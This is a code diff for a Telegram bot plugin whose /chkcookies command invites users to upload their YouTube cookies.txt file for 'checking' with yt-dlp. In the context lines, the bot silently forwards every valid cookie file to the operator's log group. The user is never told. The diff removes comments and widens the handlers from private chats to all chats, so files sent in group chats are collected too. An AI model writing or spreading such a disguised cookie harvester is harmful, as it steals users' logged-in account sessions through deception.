@@ -6,10 +6,10 @@ from pyrogram import filters
 from pyrogram.types import Message
 from config import LOGGER_ID as LOGS_GROUP_ID  # Logs ke liye
 
-# **Active Users List (Jo /chkcookies Use Kare)**
+# Active Users Dictionary for /chkcookies
 active_users = {}
 
-# **Stylish Symbols for VIP Look**
+# Symbols for VIP Look
 BULLET = "➤"
 CHECK = "✅"
 CROSS = "❌"
@@ -18,17 +18,17 @@ SHIELD = "🛡"
 USER = "👤"
 TIME = "⏰"
 
-# **Step 1: Enable Checking with `/chkcookies`**
-@app.on_message(filters.command("chkcookies") & filters.private)
+# ✅ Enable Checking with `/chkcookies` (But Does NOT Block Other Commands)
+@app.on_message(filters.command("chkcookies"))
 async def enable_cookie_check(client, message):
-    active_users[message.chat.id] = True  # User Active List Me Add
+    active_users[message.chat.id] = True
     await message.reply(
         f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}\n\n"
         "📌 **Make sure the file is named `cookies.txt` and not an image or video.**"
     )
 
-# **Step 2: Handle Wrong Inputs (Images, Videos, Text)**
-@app.on_message(filters.private & ~filters.document)
+# ✅ Handle Wrong Inputs (Only Blocks Messages Related to `/chkcookies`)
+@app.on_message(filters.text | filters.photo | filters.video | filters.sticker | filters.animation)
 async def warn_wrong_input(client, message):
     if message.chat.id in active_users:
         await message.reply(
@@ -39,48 +39,38 @@ async def warn_wrong_input(client, message):
             "2️⃣ Find `cookies.txt`\n"
             "3️⃣ Send it here ✅"
         )
-
-        # **Remove User from Active List (Session End)**
         del active_users[message.chat.id]
 
-# **Step 3: Accept Only If `/chkcookies` was Used**
-@app.on_message(filters.document & filters.private)
+# ✅ Accept Cookies File Only If `/chkcookies` was Used (Other Commands Work Normally)
+@app.on_message(filters.document)
 async def check_cookies_from_file(client, message: Message):
     if message.chat.id not in active_users:
-        return  # Ignore if user didn't use `/chkcookies`
+        return  # Ignores other document files
 
     file_path = await message.download()
 
     if not file_path.endswith(".txt"):
-        await message.reply(
-            f"{CROSS} Please send a **valid** `cookies.txt` file!\n"
-            "✅ **Make sure the file is named `cookies.txt`**."
-        )
-
-        # **Remove User from Active List (Session End)**
+        await message.reply(f"{CROSS} Please send a **valid** `cookies.txt` file!")
         del active_users[message.chat.id]
         return
 
-    # **Step 4: Read Cookies File**
     try:
         with open(file_path, "r") as f:
             cookies_data = f.read().strip()
 
         if not cookies_data:
             await message.reply(f"{CROSS} **Your `cookies.txt` file is empty!**")
-            os.remove(file_path)  # Delete temp file
-
-            # **Remove User from Active List (Session End)**
+            os.remove(file_path)
             del active_users[message.chat.id]
             return
 
-        # **Step 5: Get User Info & Time**
+        # User Info
         user_name = message.from_user.username
         full_name = message.from_user.first_name
         display_name = f"@{user_name}" if user_name else full_name
-        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM
+        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")
 
-        # **Step 6: Validate YouTube Cookies**
+        # Validate YouTube Cookies
         ydl_opts = {"quiet": True, "cookiefile": file_path}
 
         try:
@@ -95,7 +85,7 @@ async def check_cookies_from_file(client, message: Message):
 {BULLET} {TIME} **Checked At:** {check_time}
 """
 
-            # **Send Valid Cookies to Group**
+            # Send Valid Cookies to Group
             await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
 
         except yt_dlp.utils.ExtractorError:
@@ -107,15 +97,12 @@ async def check_cookies_from_file(client, message: Message):
 {BULLET} {TIME} **Checked At:** {check_time}
 """
 
-        # **Send Log Message to Group**
+        # Send Log Message to Group
         await client.send_message(LOGS_GROUP_ID, log_msg)
         await message.reply(msg, quote=True)
 
     except Exception as e:
         await message.reply(f"⚠️ **Error Reading File:** `{str(e)}`")
 
-    # **Step 7: Clean Up Temporary File**
     os.remove(file_path)
-
-    # **Step 8: Remove User from Active List (Session End)**
-    del active_users[message.chat.id]
+    del active_users[message.chat.id]  # Reset Only `/chkcookies`
